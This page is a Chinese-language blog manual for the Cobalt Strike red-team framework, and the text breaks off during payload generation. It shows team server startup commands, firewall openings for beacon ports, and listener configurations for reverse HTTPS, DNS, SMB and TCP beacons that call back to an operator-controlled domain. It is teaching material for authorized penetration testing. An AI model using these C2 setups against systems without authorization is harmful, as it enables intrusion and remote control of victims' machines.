@@ -1,0 +1,1485 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/admin.jpg">
+  <link rel="icon" href="/img/admin.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Cobalt Strike 实战使用手册 来源：Cobalt Strike (fortra.com)官方网站：https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;官方文档：https:&#x2F;&#x2F;hstechdocs.helpsystems.com&#x2F;hubskc&#x2F;cobalt-strike&#x2F;current&#x2F;   ⚠️ 本手册仅面向合法授权的红队演练与渗透测试。未经授权使用属违法行为。   目录 一、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike-使用手册">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2026/04/11/CobaltStrike-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="Cobalt Strike 实战使用手册 来源：Cobalt Strike (fortra.com)官方网站：https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;官方文档：https:&#x2F;&#x2F;hstechdocs.helpsystems.com&#x2F;hubskc&#x2F;cobalt-strike&#x2F;current&#x2F;   ⚠️ 本手册仅面向合法授权的红队演练与渗透测试。未经授权使用属违法行为。   目录 一、">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-11T10:41:22.000Z">
+<meta property="article:modified_time" content="2026-04-12T10:49:05.563Z">
+<meta property="article:author" content="xiaobite">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Cobalt Strike-使用手册 - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Cobalt Strike-使用手册"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-11 18:41" pubdate>
+          2026年4月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Cobalt Strike-使用手册</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Cobalt-Strike-实战使用手册"><a href="#Cobalt-Strike-实战使用手册" class="headerlink" title="Cobalt Strike 实战使用手册"></a>Cobalt Strike 实战使用手册</h1><blockquote>
+<p>来源：Cobalt Strike (fortra.com)<br>官方网站：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a><br>官方文档：<a target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/hubskc/cobalt-strike/current/">https://hstechdocs.helpsystems.com/hubskc/cobalt-strike/current/</a></p>
+</blockquote>
+<blockquote>
+<p><strong>⚠️ 本手册仅面向合法授权的红队演练与渗透测试。未经授权使用属违法行为。</strong></p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E6%A6%82%E8%BF%B0">一、概述</a></li>
+<li><a href="#%E4%BA%8C%E6%9E%B6%E6%9E%84%E4%B8%8E%E9%83%A8%E7%BD%B2">二、架构与部署</a></li>
+<li><a href="#%E4%B8%89%E5%9B%A2%E9%98%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8">三、团队服务器启动</a></li>
+<li><a href="#%E5%9B%9B%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E4%B8%8E%E7%95%8C%E9%9D%A2">四、客户端连接与界面</a></li>
+<li><a href="#%E4%BA%94%E7%9B%91%E5%90%AC%E5%99%A8listener">五、监听器（Listener）</a></li>
+<li><a href="#%E5%85%AD%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90payload">六、载荷生成（Payload）</a></li>
+<li><a href="#%E4%B8%83%E4%B8%8A%E7%BA%BF%E4%B8%8E-beacon-%E4%BA%A4%E4%BA%92">七、上线与 Beacon 交互</a></li>
+<li><a href="#%E5%85%ABbeacon-%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8">八、Beacon 命令大全</a></li>
+<li><a href="#%E4%B9%9D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">九、信息收集</a></li>
+<li><a href="#%E5%8D%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">十、权限提升</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80%E5%87%AD%E6%8D%AE%E8%8E%B7%E5%8F%96">十一、凭据获取</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">十二、横向移动</a></li>
+<li><a href="#%E5%8D%81%E4%B8%89%E6%8C%81%E4%B9%85%E5%8C%96">十三、持久化</a></li>
+<li><a href="#%E5%8D%81%E5%9B%9B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86">十四、端口转发与代理</a></li>
+<li><a href="#%E5%8D%81%E4%BA%94%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB">十五、钓鱼攻击</a></li>
+<li><a href="#%E5%8D%81%E5%85%ADmalleable-c2-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">十六、Malleable C2 配置文件</a></li>
+<li><a href="#%E5%8D%81%E4%B8%83aggressor-script-%E8%84%9A%E6%9C%AC">十七、Aggressor Script 脚本</a></li>
+<li><a href="#%E5%8D%81%E5%85%AB%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90">十八、报告生成</a></li>
+<li><a href="#%E5%8D%81%E4%B9%9D%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E4%B8%8E%E8%A7%84%E9%81%BF">十九、安全加固与规避</a></li>
+<li><a href="#%E4%BA%8C%E5%8D%81%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E9%80%9F%E6%9F%A5">二十、实战场景速查</a></li>
+<li><a href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E5%B8%B8%E8%A7%81%E8%B8%A9%E5%9D%91">二十一、常见踩坑</a></li>
+</ul>
+<hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>Cobalt Strike（简称 CS）是一款商业化的<strong>红队渗透测试平台</strong>，集成了社工攻击、漏洞利用、后渗透、横向移动等完整的攻击链功能，支持团队协作和分布式操作。</p>
+<p><strong>核心特点：</strong></p>
+<ul>
+<li>🎯 <strong>完整攻击链</strong>：社工 → 初始访问 → 权限提升 → 横向移动 → 数据窃取 → 持久化</li>
+<li>🔌 <strong>多协议 C2</strong>：HTTP &#x2F; HTTPS &#x2F; DNS &#x2F; SMB &#x2F; TCP Beacon</li>
+<li>🤖 <strong>Beacon</strong>：功能强大的后渗透 Agent</li>
+<li>👥 <strong>团队协作</strong>：多操作员同时操作同一目标</li>
+<li>🎭 <strong>流量伪装</strong>：Malleable C2 自定义 C2 流量特征</li>
+<li>📝 <strong>脚本扩展</strong>：Aggressor Script 自定义功能</li>
+<li>📊 <strong>报告生成</strong>：自动生成渗透测试报告</li>
+</ul>
+<p><strong>架构说明</strong>：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌─────────────────────────────────────────────────────────┐<br>│                    Cobalt Strike                        │<br>│                                                         │<br>│  ┌──────────┐  ┌──────────┐  ┌──────────┐              │<br>│  │ <span class="hljs-keyword">Operator</span> │  │ <span class="hljs-keyword">Operator</span> │  │ <span class="hljs-keyword">Operator</span> │  ← 客户端    │<br>│  └────┬─────┘  └────┬─────┘  └────┬─────┘              │<br>│       │              │              │                   │<br>│       └──────────────┼──────────────┘                   │<br>│                      ▼                                  │<br>│              ┌──────────────┐                           │<br>│              │ Team <span class="hljs-keyword">Server</span>  │  ← 服务端（Linux）        │<br>│              └──────┬───────┘                           │<br>│                     │                                   │<br>│          ┌──────────┼──────────┐                        │<br>│          ▼          ▼          ▼                        │<br>│      ┌──────┐  ┌──────┐  ┌──────┐                      │<br>│      │Beacon│  │Beacon│  │Beacon│  ← 目标主机          │<br>│      └──────┘  └──────┘  └──────┘                      │<br>└─────────────────────────────────────────────────────────┘<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、架构与部署"><a href="#二、架构与部署" class="headerlink" title="二、架构与部署"></a>二、架构与部署</h2><h3 id="2-1-环境要求"><a href="#2-1-环境要求" class="headerlink" title="2.1 环境要求"></a>2.1 环境要求</h3><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>系统要求</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Team Server</strong></td>
+<td>Linux（推荐 Kali &#x2F; Ubuntu），Java 11+，2GB+ 内存</td>
+</tr>
+<tr>
+<td><strong>Client</strong></td>
+<td>Windows &#x2F; macOS &#x2F; Linux，Java 11+</td>
+</tr>
+<tr>
+<td><strong>目标</strong></td>
+<td>Windows &#x2F; Linux &#x2F; macOS（Beacon 支持）</td>
+</tr>
+</tbody></table>
+<h3 id="2-2-部署架构"><a href="#2-2-部署架构" class="headerlink" title="2.2 部署架构"></a>2.2 部署架构</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">      互联网<br>        │<br>┌───────┴───────┐<br>│   Team<span class="hljs-built_in"> Server </span>│ ← 公网 VPS（C2 服务器）<br>│  (Linux VPS)  │<br>└───────┬───────┘<br>        │ HTTPS:443<br>        │<br>┌───────┴───────┐<br>│   防火墙<span class="hljs-built_in">/NAT </span>  │<br>└───────┬───────┘<br>        │<br>┌───────┴───────┐<br>│   目标内网     │<br>│  Beacon 上线   │<br>└───────────────┘<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-安装"><a href="#2-3-安装" class="headerlink" title="2.3 安装"></a>2.3 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Team Server（Linux）───</span><br><span class="hljs-comment"># 解压 Cobalt Strike 安装包</span><br>unzip cobaltstrike.zip -d /opt/cobaltstrike/<br><span class="hljs-built_in">cd</span> /opt/cobaltstrike/<br><br><span class="hljs-comment"># 安装 Java（如未安装）</span><br><span class="hljs-built_in">sudo</span> apt install openjdk-11-jdk<br><br><span class="hljs-comment"># 验证</span><br>java -version<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、团队服务器启动"><a href="#三、团队服务器启动" class="headerlink" title="三、团队服务器启动"></a>三、团队服务器启动</h2><h3 id="3-1-启动-Team-Server"><a href="#3-1-启动-Team-Server" class="headerlink" title="3.1 启动 Team Server"></a>3.1 启动 Team Server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 基础启动 ───</span><br><span class="hljs-built_in">sudo</span> ./teamserver &lt;服务器IP&gt; &lt;密码&gt; [Malleable C2配置文件]<br><br><span class="hljs-comment"># ─── 示例 ───</span><br><span class="hljs-built_in">sudo</span> ./teamserver 192.168.1.100 P@ssw0rd!<br><br><span class="hljs-comment"># ─── 使用 Malleable C2 配置 ───</span><br><span class="hljs-built_in">sudo</span> ./teamserver 192.168.1.100 P@ssw0rd! /path/to/profile.profile<br><br><span class="hljs-comment"># ─── 指定端口（默认 50050）───</span><br><span class="hljs-built_in">sudo</span> ./teamserver 192.168.1.100 P@ssw0rd! -port 50050<br><br><span class="hljs-comment"># ─── 后台运行 ───</span><br><span class="hljs-built_in">nohup</span> <span class="hljs-built_in">sudo</span> ./teamserver 192.168.1.100 P@ssw0rd! &gt; cs.log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-2-teamserver-参数"><a href="#3-2-teamserver-参数" class="headerlink" title="3.2 teamserver 参数"></a>3.2 teamserver 参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;IP&gt;</code></td>
+<td>Team Server 监听 IP</td>
+</tr>
+<tr>
+<td><code>&lt;密码&gt;</code></td>
+<td>客户端连接密码</td>
+</tr>
+<tr>
+<td><code>[配置文件]</code></td>
+<td>Malleable C2 配置文件路径</td>
+</tr>
+<tr>
+<td><code>-port &lt;端口&gt;</code></td>
+<td>自定义 Team Server 端口</td>
+</tr>
+</tbody></table>
+<h3 id="3-3-防火墙配置"><a href="#3-3-防火墙配置" class="headerlink" title="3.3 防火墙配置"></a>3.3 防火墙配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 开放 Team Server 端口 ───</span><br><span class="hljs-built_in">sudo</span> ufw allow 50050/tcp    <span class="hljs-comment"># 客户端连接</span><br><br><span class="hljs-comment"># ─── 开放 Beacon 监听端口 ───</span><br><span class="hljs-built_in">sudo</span> ufw allow 443/tcp      <span class="hljs-comment"># HTTPS Beacon</span><br><span class="hljs-built_in">sudo</span> ufw allow 80/tcp       <span class="hljs-comment"># HTTP Beacon</span><br><span class="hljs-built_in">sudo</span> ufw allow 53/udp       <span class="hljs-comment"># DNS Beacon</span><br><span class="hljs-built_in">sudo</span> ufw allow 4443/tcp     <span class="hljs-comment"># TCP Beacon</span><br><br><span class="hljs-comment"># ─── 查看规则 ───</span><br><span class="hljs-built_in">sudo</span> ufw status<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、客户端连接与界面"><a href="#四、客户端连接与界面" class="headerlink" title="四、客户端连接与界面"></a>四、客户端连接与界面</h2><h3 id="4-1-启动客户端"><a href="#4-1-启动客户端" class="headerlink" title="4.1 启动客户端"></a>4.1 启动客户端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Linux / macOS ───</span><br>./cobaltstrike<br><br><span class="hljs-comment"># ─── Windows ───</span><br>cobaltstrike.bat<br></code></pre></td></tr></table></figure>
+
+<p><strong>连接信息</strong>：</p>
+<ul>
+<li>Host：Team Server IP</li>
+<li>Port：50050（默认）</li>
+<li>User：任意用户名</li>
+<li>Password：启动时设置的密码</li>
+</ul>
+<h3 id="4-2-界面布局"><a href="#4-2-界面布局" class="headerlink" title="4.2 界面布局"></a>4.2 界面布局</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">┌──────────────────────────────────────────────────────┐<br>│  Menu <span class="hljs-built_in">Bar</span>                                            │<br>├──────────┬───────────────────────────────────────────┤<br>│          │                                           │<br>│  Targets │          Beacon Console                   │<br>│  <span class="hljs-built_in">View</span>    │          (选中 Beacon 后显示)              │<br>│          │                                           │<br>│          │                                           │<br>├──────────┴───────────────────────────────────────────┤<br>│  <span class="hljs-keyword">Output</span> / Event <span class="hljs-built_in">Log</span> / Web <span class="hljs-built_in">Log</span>                        │<br>└──────────────────────────────────────────────────────┘<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-3-主要菜单"><a href="#4-3-主要菜单" class="headerlink" title="4.3 主要菜单"></a>4.3 主要菜单</h3><table>
+<thead>
+<tr>
+<th>菜单</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Cobalt Strike</strong></td>
+<td>监听器管理、载荷生成、脚本管理</td>
+</tr>
+<tr>
+<td><strong>View</strong></td>
+<td>目标视图、凭据、下载、截图、键盘记录等</td>
+</tr>
+<tr>
+<td><strong>Attacks</strong></td>
+<td>钓鱼攻击（邮件&#x2F;网站&#x2F;Web 交付）</td>
+</tr>
+<tr>
+<td><strong>Reporting</strong></td>
+<td>报告生成</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、监听器（Listener）"><a href="#五、监听器（Listener）" class="headerlink" title="五、监听器（Listener）"></a>五、监听器（Listener）</h2><h3 id="5-1-创建监听器"><a href="#5-1-创建监听器" class="headerlink" title="5.1 创建监听器"></a>5.1 创建监听器</h3><p><strong>路径</strong>：<code>Cobalt Strike → Listeners → Add</code></p>
+<h3 id="5-2-监听器类型"><a href="#5-2-监听器类型" class="headerlink" title="5.2 监听器类型"></a>5.2 监听器类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HTTP</strong></td>
+<td>HTTP 协议通信</td>
+<td>通用，易被检测</td>
+</tr>
+<tr>
+<td><strong>HTTPS</strong></td>
+<td>加密 HTTP 通信</td>
+<td><strong>推荐</strong>，加密流量</td>
+</tr>
+<tr>
+<td><strong>DNS</strong></td>
+<td>DNS 协议通信</td>
+<td>隐蔽性最高，速度慢</td>
+</tr>
+<tr>
+<td><strong>SMB</strong></td>
+<td>SMB 管道通信</td>
+<td>内网横向移动</td>
+</tr>
+<tr>
+<td><strong>TCP</strong></td>
+<td>直接 TCP 连接</td>
+<td>内网直连</td>
+</tr>
+<tr>
+<td><strong>External C2</strong></td>
+<td>外部控制器</td>
+<td>自定义 C2 通道</td>
+</tr>
+</tbody></table>
+<h3 id="5-3-HTTP-HTTPS-监听器配置"><a href="#5-3-HTTP-HTTPS-监听器配置" class="headerlink" title="5.3 HTTP&#x2F;HTTPS 监听器配置"></a>5.3 HTTP&#x2F;HTTPS 监听器配置</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Name:</span>        https_listener<br><span class="hljs-params">Payload:</span>     windows<span class="hljs-symbol">/beacon_https/reverse_https</span><br><span class="hljs-params">Host:</span>        your-vps-domain.com    ← 必须是域名（HTTPS）<br><span class="hljs-params">Port:</span>        <span class="hljs-number">443</span><br><span class="hljs-params">SSL:</span>         使用自签名或正规证书<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-4-DNS-监听器配置"><a href="#5-4-DNS-监听器配置" class="headerlink" title="5.4 DNS 监听器配置"></a>5.4 DNS 监听器配置</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Name:</span>        dns_listener<br><span class="hljs-params">Payload:</span>     windows<span class="hljs-symbol">/beacon_dns/reverse_dns_txt</span><br>DNS <span class="hljs-params">Hosts:</span>   ns1.your-domain.com, ns2.your-domain.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>DNS Beacon 前置条件</strong>：</p>
+<ol>
+<li>注册域名，设置 NS 记录指向 Team Server</li>
+<li>Team Server 需要监听 UDP 53 端口</li>
+</ol>
+<h3 id="5-5-SMB-Beacon"><a href="#5-5-SMB-Beacon" class="headerlink" title="5.5 SMB Beacon"></a>5.5 SMB Beacon</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Name:</span>        smb_listener<br><span class="hljs-params">Payload:</span>     windows<span class="hljs-symbol">/beacon_bind_pipe</span><br><span class="hljs-params">Pipe:</span>        msagent_XX（自动生成）<br></code></pre></td></tr></table></figure>
+
+<p><strong>用途</strong>：内网横向移动，通过已有的 Beacon 派生 SMB Beacon</p>
+<h3 id="5-6-TCP-Beacon"><a href="#5-6-TCP-Beacon" class="headerlink" title="5.6 TCP Beacon"></a>5.6 TCP Beacon</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Name:</span>        tcp_listener<br><span class="hljs-params">Payload:</span>     windows<span class="hljs-symbol">/beacon_bind_tcp</span><br><span class="hljs-params">Port:</span>        <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="5-7-Foreign-监听器（联动-MSF）"><a href="#5-7-Foreign-监听器（联动-MSF）" class="headerlink" title="5.7 Foreign 监听器（联动 MSF）"></a>5.7 Foreign 监听器（联动 MSF）</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">Name:</span>        msf_listener<br><span class="hljs-symbol">Payload:</span>     windows<span class="hljs-keyword">/foreign/</span>reverse_https<br><span class="hljs-symbol">Host:</span>        msf-server-ip<br><span class="hljs-symbol">Port:</span>        <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、载荷生成（Payload）"><a href="#六、载荷生成（Payload）" class="headerlink" title="六、载荷生成（Payload）"></a>六、载荷生成（Payload）</h2><h3 id="6-1-生成路径"><a href="#6-1-生成路径" class="headerlink" title="6.1 生成路径"></a>6.1 生成路径</h3><p><code>Cobalt Strike → Listeners → 选择监听器 → Payload → Windows Stageless Payload</code></p>
+<p>或：<code>Attacks → Packages → ...</code></p>
+<h3 id="6-2-载荷类型"><a href="#6-2-载荷类型" class="headerlink" title="6.2 载荷类型"></a>6.2 载荷类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>路径</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Windows Executable</strong></td>
+<td><code>Packages → Windows Executable (S)</code></td>
+<td>EXE 文件（Stageless）</td>
